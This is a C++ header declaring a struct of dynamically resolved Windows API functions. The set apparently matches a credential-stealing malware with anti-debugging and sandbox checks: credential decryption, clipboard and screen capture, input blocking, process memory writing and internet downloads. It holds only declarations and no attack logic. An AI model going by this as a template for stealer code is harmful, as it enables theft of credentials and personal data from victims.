#pragma once

#include <windows.h>
#include <tlhelp32.h>
#include <iphlpapi.h>

typedef LPVOID HINTERNET;
typedef WORD INTERNET_PORT;

struct windows_api {
public:
	FARPROC WINAPI _GetProcAddress(HMODULE hModule, LPCSTR lpProcName);
	HMODULE WINAPI _LoadLibraryA(LPCSTR lpLibFileName);
public:
	HINTERNET WINAPI InternetOpenA(LPCSTR lpszAgent, DWORD dwAccessType, LPCSTR lpszProxy, LPCSTR lpszProxyBypass, DWORD dwFlags);
	HINTERNET WINAPI InternetConnectA(HINTERNET hInternet, LPCSTR lpszServerName, INTERNET_PORT nServerPort, LPCSTR lpszUserName, LPCSTR lpszPassword, DWORD dwService, DWORD dwFlags, DWORD_PTR dwContext);
	HINTERNET WINAPI InternetOpenUrlA(HINTERNET hInternet, LPCSTR lpszUrl, LPCSTR lpszHeaders, DWORD dwHeadersLength, DWORD dwFlags, DWORD_PTR dwContext);
	BOOL WINAPI InternetReadFile(HINTERNET hFile, LPVOID lpBuffer, DWORD dwNumberOfBytesToRead, LPDWORD lpdwNumberOfBytesRead);
	BOOL WINAPI InternetCloseHandle(HINTERNET hInternet);
	VOID WINAPI GetSystemInfo(LPSYSTEM_INFO lpSystemInfo);
	BOOL WINAPI CopyFileA(LPCSTR lpExistingFileName, LPCSTR lpNewFileName, BOOL bFailIfExists);
	HANDLE WINAPI CreateFileA(LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
	BOOL WINAPI WriteFile(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped);
	ULONG WINAPI GetAdaptersInfo(IP_ADAPTER_INFO AdapterInfo, PULONG SizePointer);
	BOOL WINAPI CreateProcessA(LPCSTR lpApplicationName, LPSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCSTR lpCurrentDirectory, LPSTARTUPINFOA lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation);
	DWORD WINAPI WaitForSingleObject(HANDLE hHandle, DWORD dwMilliseconds);
	BOOL WINAPI CloseHandle(HANDLE hObject);
	DWORD WINAPI GetEnvironmentVariableA(LPCSTR lpName, LPSTR lpBuffer, DWORD nSize);
	HMODULE WINAPI GetModuleHandleA(LPCSTR lpModuleName);
	BOOL WINAPI BlockInput(BOOL bEnable);
	DWORD WINAPI GetModuleFileNameA(HMODULE hModule, LPSTR lpFilename, DWORD nSize);
	BOOL WINAPI EnumDisplayDevicesA(LPCSTR lpDevice, DWORD iDevNum, PDISPLAY_DEVICEA lpDisplayDevice, DWORD dwFlags);
	VOID WINAPI Sleeping(DWORD dwMilliseconds);
	BOOL WINAPI ShowWindow(HWND hWnd, int nCmdShow);
	BOOL WINAPI GetComputerNameA(LPSTR lpBuffer, LPDWORD nSize);
	BOOL WINAPI InternetCheckConnectionA(LPCSTR lpszUrl, DWORD dwFlags, DWORD dwReserved);
	DWORD WINAPI GetModuleBaseNameA(HANDLE hProcess, HMODULE hModule, LPSTR lpBaseName, DWORD nSize);
	BOOL WINAPI GlobalMemoryStatusEx(LPMEMORYSTATUSEX lpBuffer);
	HANDLE WINAPI CreateToolhelp32Snapshot(DWORD dwFlags, DWORD th32ProcessID);
	BOOL WINAPI Process32First(HANDLE hSnapshot, LPPROCESSENTRY32 lppe);
	BOOL WINAPI Process32Next(HANDLE hSnapshot, LPPROCESSENTRY32 lppe);
	HANDLE WINAPI OpenProcess(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId);
	BOOL WINAPI TerminateProcess(HANDLE hProcess, UINT uExitCode);
	BOOL WINAPI OpenClipboard(HWND hWndNewOwner);
	HANDLE WINAPI GetClipboardData(UINT uFormat);
	LPVOID WINAPI GlobalLock(HGLOBAL hMem);
	BOOL WINAPI GlobalUnlock(HGLOBAL hMem);
	BOOL WINAPI CloseClipboard(VOID);
	HWND WINAPI GetDesktopWindow(VOID);
	BOOL WINAPI GetWindowRect(HWND hWnd, LPRECT lpRect);
	HANDLE WINAPI FindFirstFileA(LPCSTR lpFileName, LPWIN32_FIND_DATAA lpFindFileData);
	BOOL WINAPI FindNextFileA(HANDLE hFindFile, LPWIN32_FIND_DATAA lpFindFileData);
	BOOL WINAPI FindClose(HANDLE hFindFile);
	BOOL WINAPI GetCursorPos(LPPOINT lpPoint);
	PSTR WINAPI StrStrA(PCSTR pszFirst, PCSTR pszSrch);
	HINSTANCE WINAPI ShellExecuteA(HWND hwnd, LPCSTR lpOperation,
		LPCSTR lpFile, LPCSTR lpParameters, LPCSTR lpDirectory, INT nShowCmd);
	BOOL WINAPI CryptUnprotectData(DATA_BLOB* pDataIn, LPWSTR* ppszDataDescr, DATA_BLOB* pOptionalEntropy, PVOID pvReserved, CRYPTPROTECT_PROMPTSTRUCT* pPromptStruct, DWORD dwFlags, DATA_BLOB* pDataOut);
	BOOL WINAPI GetVersionExA(LPOSVERSIONINFOA lpVersionInformation);
	BOOL WINAPI OpenProcessToken(HANDLE ProcessHandle, DWORD DesiredAccess, PHANDLE TokenHandle);
	HANDLE WINAPI GetCurrentProcess(VOID);
	BOOL WINAPI GetCurrentHwProfileA(LPHW_PROFILE_INFOA lpHwProfileInfo);
	BOOL WINAPI DeleteFileA(LPCSTR lpFileName);
	int WINAPI GetSystemMetrics(int nIndex);
	HDC WINAPI CreateCompatibleDC(HDC hdc);
	HBITMAP WINAPI CreateCompatibleBitmap(HDC hdc, int cx, int cy);
	HGDIOBJ WINAPI SelectObject(HDC hdc, HGDIOBJ h);
	BOOL WINAPI BitBlt(HDC hdc, int x, int y, int cx, int cy, HDC hdcSrc, int x1, int y1, DWORD rop);
	BOOL WINAPI DeleteDC(HDC hdc);
	BOOL WINAPI DeleteObject(HGDIOBJ ho);
	int WINAPI ReleaseDC(HWND hWnd, HDC hDC);
	HLOCAL WINAPI LocalFree(HLOCAL hMem);
	int WINAPI GetLocaleInfoA(LCID Locale, LCTYPE LCType, LPSTR lpLCData, int cchData);
	HANDLE WINAPI CreateMutexA(LPSECURITY_ATTRIBUTES lpMutexAttributes, BOOL bInitialOwner, LPCSTR lpName);
	BOOL WINAPI ReleaseMutex(HANDLE hMutex);
	BOOL WINAPI IsDebuggerPresent();
	LSTATUS WINAPI RegOpenKeyExA(HKEY hKey, LPCSTR lpSubKey, DWORD ulOptions, REGSAM samDesired, PHKEY phkResult);
	LSTATUS WINAPI RegQueryValueExA(HKEY hKey, LPCSTR lpValueName, LPDWORD lpReserved, LPDWORD lpType, LPBYTE lpData, LPDWORD lpcbData);
	DWORD WINAPI GetCurrentProcessId(VOID);
	BOOL WINAPI VirtualProtectEx(HANDLE hProcess, LPVOID lpAddress,  SIZE_T dwSize, DWORD flNewProtect, PDWORD lpflOldProtect);
	BOOL WINAPI WriteProcessMemory(HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T* lpNumberOfBytesWritten);
	BOOL WINAPI CheckRemoteDebuggerPresent(HANDLE hProcess, PBOOL pbDebuggerPresent);
	BOOL WINAPI GetSystemTimes(PFILETIME lpIdleTime, PFILETIME lpKernelTime, PFILETIME lpUserTime);
	DWORD WINAPI SleepEx(DWORD dwMilliseconds, BOOL bAlertable);
	VOID WINAPI ExitProcess(UINT uExitCode);
	BOOL WINAPI PeekMessageA(LPMSG lpMsg, HWND hWnd, UINT wMsgFilterMin, UINT wMsgFilterMax, UINT wRemoveMsg);
	BOOL WINAPI TranslateMessage(CONST MSG *lpMsg);
	LRESULT WINAPI DispatchMessageA(CONST MSG *lpMsg);
	VOID WINAPI GetSystemTime(LPSYSTEMTIME lpSystemTime);
	BOOL WINAPI SystemTimeToFileTime(CONST SYSTEMTIME* lpSystemTime, LPFILETIME lpFileTime);
	DWORD WINAPI GetTickCount(VOID);
	BOOL WINAPI GetSystemPowerStatus(LPSYSTEM_POWER_STATUS lpSystemPowerStatus);
	VOID WINAPI DebugBreak(VOID);
	HANDLE WINAPI CreateThread(LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);
	VOID WINAPI keybd_event(BYTE bVk, BYTE bScan, DWORD dwFlags, ULONG_PTR dwExtraInfo);
	HRESULT WINAPI CreateStreamOnHGlobal(HGLOBAL hGlobal, BOOL fDeleteOnRelease, LPSTREAM *ppstm);
	BOOL WINAPI FreeLibrary(HMODULE hLibModule);
};

extern windows_api g_winapi;